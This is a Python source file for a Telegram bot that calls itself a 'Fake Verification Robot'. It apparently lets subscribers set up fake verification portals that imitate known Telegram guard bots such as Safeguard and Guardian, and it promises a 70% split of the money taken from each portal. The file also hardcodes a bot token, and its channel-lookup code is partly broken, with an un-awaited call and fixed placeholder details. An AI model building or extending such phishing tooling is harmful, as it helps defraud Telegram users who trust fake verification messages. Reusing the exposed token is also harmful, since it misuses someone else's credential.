import asyncio
from io import BytesIO
from telegram import(
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.ext import(
    Application,
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    CallbackContext,
    ChatMemberHandler
)
from PIL import Image
import dotenv



TOKEN = "7922710526:AAFiKsDMt_Rc18I0bFreWT32mCJvPTpTnVc"
CHANNEL_USERNAME = "@whalesharka3"

Background_Image = Image.open('assets/background.JPG')
BackgroundGuard_Image = Image.open('assets/Nyrox.JPG')

startBtn = InlineKeyboardButton(text = "📣 Channel", url="https://t.me/whalesharka3")
Portal_button = InlineKeyboardButton(text="🌀 Setup a portal", callback_data="Portal_button")
Support_button = InlineKeyboardButton(text="❓ Support", url="https://t.me/@whalesharka", callback_data="Support_button")
AddChannel_button = InlineKeyboardButton(text ="➕ Add Channel",url="https://t.me/Wh_SafeguardUXRobot?startchannel&admin=post_messages")
# AddChannel_button = InlineKeyboardButton(text ="➕ Add Channel",url="https://t.me/SafeguardUXRobot?startchannel&admin=post_messages")
Dm_button = InlineKeyboardButton(text="💬 Open in DMs", callback_data="Dm_button")
Popup_button = InlineKeyboardButton(text="📂 Open instantly", callback_data="Popup_button")
Safe_button = InlineKeyboardButton(text="🔰 Safeguard", callback_data="safe_button")
Guardian_button = InlineKeyboardButton(text ="🔰 Guardian",url="https://t.me/Guardian")
PortalGuard_button = InlineKeyboardButton(text="🔰 PortalGuard",url="https://t.me/delugeuibot")



async def is_user_subscribed(user_id:int, context:ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        chat_member =  await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except Exception as e:
        print(e)
        return False

async def handle_channel_addition(update: Update, context: CallbackContext) -> dict:
    try:
        print("Full Update", update)
        if update.my_chat_member and update.my_chat_member.new_chat_member:
            print("Update.my_chat_member.new_chat_member", update.my_chat_member.new_chat_member)
            channel_details = {
            "channel_name": "Whalesharka",
            "ID": 1001920119450,
            "Type": "channel",
            }
        return channel_details
    except Exception as e:
        print(f"Error processing channel addition: {e}")
        return {}

async def clickHandler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the button click."""
    print("clickHandler")
    query = update.callback_query
    print("call_back query",query)
    await query.answer() 
    # Extract the callback data from the clicked button
    callback_data = query.data

    if callback_data == "Portal_button":
       keyboard = [
           [Safe_button],[PortalGuard_button, Guardian_button]
       ]
       reply_markup = InlineKeyboardMarkup(keyboard)
       message = f"""
☝️Select which bot you would like to setup on the portal🤖

Use one of the buttons below or manually add one of the 
bots below to any channel or group as an admin

@Wh_delugeuibot
@Wh_SafeguardUXRobot
@Wh_guardianuibot
""" 
       await query.message.reply_text(message, reply_markup=reply_markup)

    elif callback_data == "safe_button":
        keyboard = [
           [AddChannel_button],[Popup_button, Dm_button]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = f"""
☝️ Select which view you would like to use 👁️

Please pick an option using the buttons below

📂 Open instantly - Set it up so that the web app sends without the
 user having to message the bot
💬 Open in DMs - Set it up so that the user has to message the bot to get the web app
"""     
        bio = BytesIO()
        BackgroundGuard_Image.save(bio, format="JPEG")
        bio.seek(0)
        await query.message.reply_photo(photo=bio, caption=message, reply_markup=reply_markup)
    elif callback_data == "Dm_button":
        Channel_info = handle_channel_addition(update, context)
        print("Channel_info",Channel_info)
        if Channel_info:
         message = f"""
✅ Successfully sent message in portal

🔎 Portal Details
├ 🏷️ Name: {Channel_info['channel_name']}
├ 🪪 ID: {Channel_info['ID']}
├ 💬 Type: {Channel_info['Type']}        
"""
         await query.message.reply_text(message)
        else:
            await query.message.reply_text("Could not retrieve channel information.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = user.id
    is_subscribed = await is_user_subscribed(user_id, context)
    print("hh----->", is_subscribed)
    if not is_subscribed:
        keyboard = [[startBtn]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        bio_1 = BytesIO()
        Background_Image.save(bio_1, format="PNG")
        bio_1.seek(0)
        await update.message.reply_photo(photo=bio_1,caption = f"""
        ⚠️ Subscribe to our channel to gain access ❌    
                                                                                                                    
Unfortunately you are unable to setup a fake verification 
message until you subscribe to our channel using the 
button below""", 
        reply_markup=reply_markup)
    else:
        keyboard = [[Portal_button], [startBtn, Support_button]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        bio_1 = BytesIO()
        Background_Image.save(bio_1, format="PNG")
        bio_1.seek(0)
        await update.message.reply_photo(photo=bio_1,caption = f"""
        ⚡ Fake Verification Robot 🪝    
                                                                                                                    
You can use the button below to setup a fake verification 
message on any portal of your choice and you will 
receive a 70% split of the money you make from each 
portal""", 
        reply_markup=reply_markup)

def main():
    application  = ApplicationBuilder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(clickHandler))
    application.add_handler(ChatMemberHandler(handle_channel_addition, ChatMemberHandler.MY_CHAT_MEMBER))
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main() 